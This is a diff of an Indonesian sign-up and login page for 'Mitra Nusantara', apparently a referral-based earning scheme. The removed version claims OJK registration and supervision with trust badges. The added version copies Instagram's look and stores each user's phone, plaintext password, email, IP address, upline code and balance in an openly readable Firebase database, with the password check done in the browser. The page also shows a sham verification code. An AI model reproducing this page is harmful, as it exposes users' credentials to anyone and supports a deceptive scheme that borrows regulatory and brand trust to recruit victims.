@@ -1,209 +1,307 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Daftar - Mitra Nusantara Partner</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daftar & Login MITRA NUSANTARA</title>
+  <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+  <style>
+    /* --- CSS DENGAN TEMA INSTAGRAM --- */
+    body { 
+      margin: 0; 
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+      background: #fafafa; 
+      color: #262626; 
+      display: flex; 
+      flex-direction: column; 
+      align-items: center; 
+    }
+
+    .header { 
+      background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+      padding: 60px 20px; 
+      text-align: left; 
+      width: 100%; 
+      box-sizing: border-box; 
+      color: white;
+    }
     
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Google Fonts: Inter -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <style>
-        body { font-family: 'Inter', sans-serif; }
-    </style>
+    .header h1 { margin: 0; font-size: 28px; font-weight: 800; }
+    .header p { opacity: 0.9; font-size: 14px; }
+
+    .container { 
+      background: white; 
+      width: 90%; 
+      border-radius: 12px; 
+      padding: 30px 20px; 
+      margin-top: -30px; 
+      color: #333; 
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
+      box-sizing: border-box;
+      border: 1px solid #dbdbdb;
+    }
+
+    .logo { 
+      text-align: center; 
+      font-size: 32px; 
+      font-weight: bold; 
+      margin-bottom: 30px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      letter-spacing: -1px;
+    }
+    .logo span { color: #8e8e8e; font-weight: 300; }
+
+    .input-group { 
+      background: #fafafa; 
+      border: 1px solid #dbdbdb; 
+      border-radius: 5px; 
+      padding: 10px; 
+      margin-bottom: 10px; 
+      display: flex; 
+      align-items: center; 
+    }
+    .input-group input { 
+      border: none; 
+      background: transparent; 
+      width: 100%; 
+      margin-left: 10px; 
+      outline: none; 
+      font-size: 14px; 
+      color: #262626;
+    }
+    .input-group span { color: #8e8e8e; font-weight: bold; font-size: 14px; }
+
+    .btn-reg { 
+      background: #0095f6; 
+      color: white; 
+      border: none; 
+      width: 100%; 
+      padding: 12px; 
+      border-radius: 8px; 
+      font-weight: bold; 
+      cursor: pointer; 
+      font-size: 14px; 
+      margin-top: 10px; 
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      min-height: 45px;
+    }
+    .btn-reg:disabled { opacity: 0.7; cursor: not-allowed; }
+
+    /* --- ANIMASI LOADING INSTAGRAM STYLE --- */
+    .loader {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .auth-switch { 
+      text-align: center; 
+      margin-top: 20px; 
+      font-size: 14px; 
+      color: #0095f6; 
+      font-weight: 600;
+      cursor: pointer; 
+      text-decoration: none; 
+    }
+    .hidden { display: none; }
+
+    /* --- CSS MODAL KUSTOM --- */
+    .custom-alert-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6); display: none;
+      justify-content: center; align-items: center; z-index: 2000;
+    }
+    .custom-alert-box {
+      background: white; padding: 25px; border-radius: 12px;
+      width: 80%; max-width: 300px; text-align: center;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    }
+    .btn-alert-ok {
+      background: transparent; 
+      color: #0095f6; 
+      border-top: 1px solid #dbdbdb;
+      padding: 15px; 
+      font-weight: bold;
+      cursor: pointer; 
+      margin-top: 15px; 
+      width: 118%;
+      margin-left: -25px;
+      margin-bottom: -25px;
+      border-bottom-left-radius: 12px;
+      border-bottom-right-radius: 12px;
+      border-right: none; border-left: none; border-bottom: none;
+    }
+  </style>
 </head>
-<body class="bg-slate-50 text-slate-800 min-h-screen selection:bg-blue-500 selection:text-white">
+<body>
+  <div class="header">
+    <p id="header-small-text">daftar</p>
+    <h1 id="header-big-text">Halo </h1>
+    <p>Selamat datang di kedatangan Anda</p>
+  </div>
 
-    <div class="max-w-md mx-auto bg-white min-h-screen shadow-sm relative pb-10">
-        
-        <!-- HEADER: Logo & Regulasi -->
-        <div class="bg-slate-50 border-b border-slate-100 px-5 py-8 text-center relative overflow-hidden">
-            <!-- Background glow -->
-            <div class="absolute inset-0 bg-gradient-to-b from-blue-100/50 to-transparent pointer-events-none"></div>
-            
-            <div class="relative z-10 flex justify-center mb-3">
-                <div class="bg-white p-3 rounded-2xl shadow-md border border-slate-100 flex items-center justify-center w-14 h-14 transition-transform hover:scale-105 duration-300">  
-                    <svg class="w-8 h-8 text-[#2563EB]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">  
-                        <path d="M3 3v18h18" />  
-                        <path d="M18.7 8l-5.1 5.2-2.8-2.7L7 14.3" />  
-                    </svg>  
-                </div>  
-            </div>
-            
-            <h1 class="text-xl font-extrabold text-slate-900 tracking-tight">Mitra Nusantara</h1>
-            <p class="text-xs text-slate-500 mt-1">Platform Kemitraan Digital Terpadu</p>
-            
-            <div class="mt-4 inline-flex items-center gap-1.5 bg-white shadow-sm border border-slate-200 px-3 py-1.5 rounded-full">
-                <span class="text-red-600 font-extrabold text-[10px]">OJK</span>
-                <span class="text-slate-600 text-[10px] font-medium">Terdaftar & Diawasi</span>
-            </div>
+  <div class="container">
+    <div class="logo">MITRA<span>NUSANTARA</span></div>
+    
+    <div class="input-group">
+      <span>+62</span>
+      <input type="text" id="phone" placeholder="Nomor HP">
+    </div>
+
+    <div class="input-group">
+      <input type="password" id="pass" placeholder="Kata Sandi">
+    </div>
+
+    <div id="register-only-fields">
+        <div class="input-group">
+          <input type="text" id="vcode" placeholder="Kode verifikasi">
+          <span style="background: #efefef; padding: 2px 8px; border-radius: 4px; color: #262626; font-style: italic;">9366</span>
         </div>
-
-        <!-- FORM PENDAFTARAN -->
-        <div class="px-5 py-6">
-            
-            <!-- Nomor HP -->
-            <div class="mb-5">
-                <label class="block text-sm font-semibold text-slate-800 mb-2">Nomor Telepon (WhatsApp)</label>
-                <div class="relative">
-                    <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
-                        <i class="fa-solid fa-phone text-slate-400"></i>
-                    </div>
-                    <input type="tel" id="phone" placeholder="Contoh: 08123456789" class="w-full pl-11 pr-4 py-3.5 bg-white border border-slate-200 rounded-2xl text-sm focus:border-[#2563EB] focus:ring-1 focus:ring-[#2563EB] outline-none transition-all">
-                </div>
-            </div>
-
-            <!-- Kata Sandi -->
-            <div class="mb-5">
-                <label class="block text-sm font-semibold text-slate-800 mb-2">Kata Sandi</label>
-                <div class="relative">
-                    <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
-                        <i class="fa-solid fa-lock text-slate-400"></i>
-                    </div>
-                    <input type="password" id="pass1" placeholder="Masukkan kata sandi" class="w-full pl-11 pr-10 py-3.5 bg-white border border-slate-200 rounded-2xl text-sm focus:border-[#2563EB] focus:ring-1 focus:ring-[#2563EB] outline-none transition-all">
-                    <div class="absolute inset-y-0 right-0 pr-4 flex items-center cursor-pointer">
-                        <i class="fa-solid fa-eye text-slate-400 hover:text-slate-600" onclick="togglePassword('pass1')"></i>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Konfirmasi Kata Sandi -->
-            <div class="mb-5">
-                <label class="block text-sm font-semibold text-slate-800 mb-2">Konfirmasi Kata Sandi</label>
-                <div class="relative">
-                    <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
-                        <i class="fa-solid fa-lock text-slate-400"></i>
-                    </div>
-                    <input type="password" id="pass2" placeholder="Ulangi kata sandi" class="w-full pl-11 pr-10 py-3.5 bg-white border border-slate-200 rounded-2xl text-sm focus:border-[#2563EB] focus:ring-1 focus:ring-[#2563EB] outline-none transition-all">
-                    <div class="absolute inset-y-0 right-0 pr-4 flex items-center cursor-pointer">
-                        <i class="fa-solid fa-eye text-slate-400 hover:text-slate-600" onclick="togglePassword('pass2')"></i>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Kode Referral -->
-            <div class="mb-6">
-                <label class="block text-sm font-semibold text-slate-800 mb-2">Kode Referral <span class="text-slate-400 font-normal">(opsional)</span></label>
-                <div class="relative">
-                    <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
-                        <i class="fa-solid fa-user-tag text-[#2563EB]"></i>
-                    </div>
-                    <input type="text" value="ZXG7B4DU" readonly class="w-full pl-11 pr-4 py-3.5 bg-blue-50 border border-blue-200 text-blue-700 font-bold rounded-2xl text-sm outline-none">
-                </div>
-            </div>
-
-            <!-- Box Verifikasi Matematika -->
-            <div class="bg-blue-50/50 border border-blue-200 rounded-2xl p-4 mb-4 relative shadow-sm">
-                <div class="absolute top-3 right-3 text-blue-500 cursor-pointer hover:text-blue-700 transition-transform active:rotate-180">
-                    <i class="fa-solid fa-rotate-right"></i>
-                </div>
-                <p class="text-[10px] text-[#2563EB] font-bold tracking-widest text-center uppercase mb-2">Verifikasi Keamanan</p>
-                <div class="flex justify-center items-center gap-3 text-2xl font-bold text-slate-800 tracking-wider">
-                    <span>6</span> <span>+</span> <span>4</span> <span>=</span> <span>?</span>
-                </div>
-            </div>
-
-            <!-- Input Verifikasi -->
-            <div class="flex justify-center mb-8">
-                <input type="number" id="captcha" placeholder="?" class="w-20 text-center py-3 bg-white border border-blue-300 rounded-xl text-lg font-bold text-[#2563EB] focus:border-[#2563EB] focus:ring-2 focus:ring-blue-500/20 outline-none shadow-sm transition-all">
-            </div>
-
-            <!-- Tombol Daftar -->
-            <button id="btnDaftar" class="w-full bg-[#2563EB] hover:bg-blue-700 text-white font-bold text-base py-4 rounded-2xl shadow-lg shadow-blue-600/20 transition-all active:scale-[0.98]">
-                Daftar & Lanjutkan
-            </button>
-
-            <!-- Link Masuk -->
-            <p class="text-center text-sm text-slate-500 mt-5">
-                Sudah punya akun keanggotaan? <a href="#" class="text-[#2563EB] font-bold hover:underline">Masuk</a>
-            </p>
-
-            <!-- Mitra Nusantara Badges (Matching Main Dashboard) -->
-            <div class="bg-[#2563EB] text-white rounded-2xl p-4 shadow-md border border-blue-600 mt-10">  
-                <div class="grid grid-cols-3 items-center">  
-                    <div class="flex flex-col items-center gap-1.5 border-r border-white/20 px-1">  
-                        <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">  
-                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 01-1.043 3.296 3.745 3.745 0 01-3.296 1.043A3.745 3.745 0 0112 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 01-3.296-1.043 3.745 3.745 0 01-1.043-3.296A3.745 3.745 0 013 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 011.043-3.296 3.746 3.746 0 013.296-1.043A3.746 3.746 0 0112 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 013.296 1.043 3.746 3.746 0 011.043 3.296A3.745 3.745 0 0121 12z"></path>  
-                        </svg>  
-                        <span class="text-[10px] font-bold tracking-tight text-center">Aman Terpercaya</span>  
-                    </div>  
-                    <div class="flex flex-col items-center gap-1.5 border-r border-white/20 px-1">  
-                        <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">  
-                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>  
-                        </svg>  
-                        <span class="text-[10px] font-bold tracking-tight text-center">Diawasi OJK</span>  
-                    </div>  
-                    <div class="flex flex-col items-center gap-1.5 px-1">  
-                        <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">  
-                            <path stroke-linecap="round" stroke-linejoin="round" d="M12.75 3.03v.568c0 .334.148.65.405.864l.468.388c.233.193.553.26.846.178l.496-.14a2.25 2.25 0 012.285 1.08l.2.35a2.25 2.25 0 01-.444 2.75l-.326.272a2.25 2.25 0 00-.732 1.342l-.195.976a2.25 2.25 0 01-2.234 1.805h-.19a2.25 2.25 0 00-2.25 2.25v.65a2.25 2.25 0 01-1.07 1.916l-.105.063a2.25 2.25 0 00-1.07 1.916v.415m0 3.12v.568A9.003 9.003 0 013 12c0-1.268.26-2.475.729-3.579m15.355 5.079a9.002 9.002 0 01-15.355-5.08M12 21.75a8.96 8.96 0 005.12-1.592.5.5 0 00.163-.506l-.21-.84a2.25 2.25 0 00-2.223-1.696H15a2.25 2.25 0 00-2.25-2.25v-.141c0-.422-.16-.828-.45-1.134l-.474-.474a2.25 2.25 0 00-3.182 0l-.549.549a2.25 2.25 0 01-1.378.634l-.392.03a2.25 2.25 0 00-1.748 1.176l-.41.821a.5.5 0 00.121.572A8.96 8.96 0 0012 21.75zM15 11.25a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0z"></path>  
-                        </svg>  
-                        <span class="text-[10px] font-bold tracking-tight text-center">Data Terenkripsi</span>  
-                    </div>  
-                </div>  
-            </div>
-
-            <!-- Footer OJK -->
-            <div class="mt-8 text-center border-t border-slate-100 pt-6">
-                <p class="text-[11px] text-slate-500 font-medium">Program Kemitraan Resmi Terdaftar</p>
-                <p class="text-[10px] text-slate-400 mt-1">No. Registrasi: AEP-4300/2024</p>
-                <p class="text-[10px] text-slate-400 mt-6">&copy; 2026 Mitra Nusantara. Hak Cipta Dilindungi.</p>
-            </div>
-
+        <div class="input-group">
+          <input type="text" id="upline" placeholder="Kode Undangan">
+        </div>
+        <div class="input-group">
+          <input type="email" id="email" placeholder="Alamat email">
         </div>
     </div>
 
-    <!-- SCRIPT LOGIC PENDAFTARAN -->
-    <script>
-        // Fitur Tampil/Sembunyikan Kata Sandi
-        function togglePassword(inputId) {
-            const input = document.getElementById(inputId);
-            if (input.type === "password") {
-                input.type = "text";
-            } else {
-                input.type = "password";
-            }
-        }
+    <button class="btn-reg" id="main-btn" onclick="handleAuth()">
+      <span id="btn-text">Daftar Sekarang</span>
+      <div class="loader" id="btn-loader"></div>
+    </button>
+    <div class="auth-switch" id="switch-link" onclick="toggleMode()">Sudah punya akun? Login di sini</div>
+  </div>
 
-        // Logic Form Pendaftaran & Redirect
-        document.getElementById('btnDaftar').addEventListener('click', function(e) {
-            e.preventDefault();
-            
-            const phone = document.getElementById('phone').value;
-            const pass1 = document.getElementById('pass1').value;
-            const pass2 = document.getElementById('pass2').value;
-            const captcha = document.getElementById('captcha').value;
+  <div id="customAlert" class="custom-alert-overlay">
+    <div class="custom-alert-box">
+      <div id="alertIcon" style="font-size: 40px; margin-bottom: 10px;">⚠️</div>
+      <h3 id="alertTitle" style="margin: 0; font-size: 18px;">PERHATIAN</h3>
+      <p id="alertMessage" style="color: #666; margin: 10px 0; font-size: 14px;">Pesan di sini</p>
+      <button class="btn-alert-ok" onclick="closeAlert()">Oke</button>
+    </div>
+  </div>
 
-            // Validasi Input Kosong
-            if(!phone || !pass1 || !pass2 || !captcha) {
-                alert('Peringatan: Harap lengkapi semua kolom pendaftaran Anda!');
-                return;
-            }
+  <script>
+    const firebaseConfig = { databaseURL: "https://admin-panel-5c204-default-rtdb.firebaseio.com/" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-            // Validasi Kata Sandi Sama
-            if(pass1 !== pass2) {
-                alert('Peringatan: Konfirmasi kata sandi tidak cocok!');
-                return;
-            }
+    let userIP = "Sedang memuat..."; 
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => { userIP = data.ip; })
+      .catch(err => { userIP = "Gagal mendeteksi"; });
 
-            // Validasi Matematika (6+4=10)
-            if(parseInt(captcha) !== 10) {
-                alert('Peringatan: Jawaban verifikasi keamanan salah! Silakan coba lagi.');
-                return;
-            }
+    let isLoginMode = false;
 
-            // Simpan User ID (Nomor HP) ke Local Storage browser untuk simulasi masuk akun
-            localStorage.setItem('user_hp', phone);
-            localStorage.setItem('is_logged_in', 'true');
-            
-            alert('Pendaftaran Berhasil!\nSelamat datang di Mitra Nusantara. Anda akan diarahkan ke Dashboard Keanggotaan.');
+    function setLoading(loading) {
+      const btn = document.getElementById('main-btn');
+      const loader = document.getElementById('btn-loader');
+      const text = document.getElementById('btn-text');
+      
+      if (loading) {
+        btn.disabled = true;
+        loader.style.display = 'block';
+        text.style.opacity = '0.5';
+      } else {
+        btn.disabled = false;
+        loader.style.display = 'none';
+        text.style.opacity = '1';
+      }
+    }
 
-            // Arahkan ke file dashboard (produk.html)
-            window.location.href = 'produk.html';
-        });
-    </script>
+    function showAlert(title, msg, isSuccess = false) {
+      setLoading(false); 
+      document.getElementById('alertTitle').innerText = title;
+      document.getElementById('alertMessage').innerText = msg;
+      document.getElementById('alertIcon').innerText = isSuccess ? "✅" : "⚠️";
+      document.getElementById('customAlert').style.display = 'flex';
+    }
+
+    function closeAlert() {
+      document.getElementById('customAlert').style.display = 'none';
+      if (document.getElementById('alertTitle').innerText.includes("BERHASIL")) {
+        window.location.href = 'dashboard.html';
+      }
+    }
+
+    function toggleMode() {
+      isLoginMode = !isLoginMode;
+      const regFields = document.getElementById('register-only-fields');
+      const mainBtnText = document.getElementById('btn-text');
+      const switchLink = document.getElementById('switch-link');
+      const headerSmall = document.getElementById('header-small-text');
+      const headerBig = document.getElementById('header-big-text');
+
+      if (isLoginMode) {
+        regFields.classList.add('hidden');
+        mainBtnText.innerText = "Login Sekarang";
+        switchLink.innerText = "Belum punya akun? Daftar di sini";
+        headerSmall.innerText = "masuk";
+        headerBig.innerText = "Selamat Datang Kembali";
+      } else {
+        regFields.classList.remove('hidden');
+        mainBtnText.innerText = "Daftar Sekarang";
+        switchLink.innerText = "Sudah punya akun? Login di sini";
+        headerSmall.innerText = "daftar";
+        headerBig.innerText = "Halo";
+      }
+    }
+
+    function handleAuth() { 
+      setLoading(true); 
+      if (isLoginMode) { login(); } else { register(); } 
+    }
+
+    function register() {
+      const phone = document.getElementById('phone').value;
+      const pass = document.getElementById('pass').value;
+      const email = document.getElementById('email').value;
+      const uplineCode = document.getElementById('upline').value;
+      
+      if(!phone || !pass || !email) {
+        return showAlert("GAGAL", "Data tidak lengkap!");
+      }
+
+      const myReffCode = "REF-" + Math.floor(100000 + Math.random() * 900000);
+      const userData = { phone, password: pass, email, reffCode: myReffCode, upline: uplineCode, balance: 5000, level: "Gratis", todayEarned: 0, ipAddress: userIP };
+      
+      db.ref('users/' + phone).set(userData).then(() => {
+        if(uplineCode) { db.ref('referrals/' + uplineCode).push({ downline: phone, date: new Date().toISOString() }); }
+        localStorage.setItem('nusantara_user', phone);
+        showAlert("BERHASIL", "Pendaftaran akun Anda sukses!", true);
+      }).catch(e => showAlert("GAGAL", e.message));
+    }
+
+    function login() {
+      const phone = document.getElementById('phone').value;
+      const pass = document.getElementById('pass').value;
+      
+      if(!phone || !pass) {
+        return showAlert("GAGAL", "Masukkan Nomor HP dan Sandi!");
+      }
+
+      db.ref('users/' + phone).once('value').then((snapshot) => {
+        if (snapshot.exists()) {
+          if (snapshot.val().password === pass) {
+            localStorage.setItem('nusantara_user', phone);
+            showAlert("BERHASIL", "Login Berhasil!", true);
+          } else { showAlert("GAGAL", "Sandi salah!"); }
+        } else { showAlert("GAGAL", "Akun tidak ditemukan!"); }
+      }).catch(e => showAlert("GAGAL", "Gagal menghubungkan ke server"));
+    }
+  </script>
 </body>
-                    </html>
+    </html>
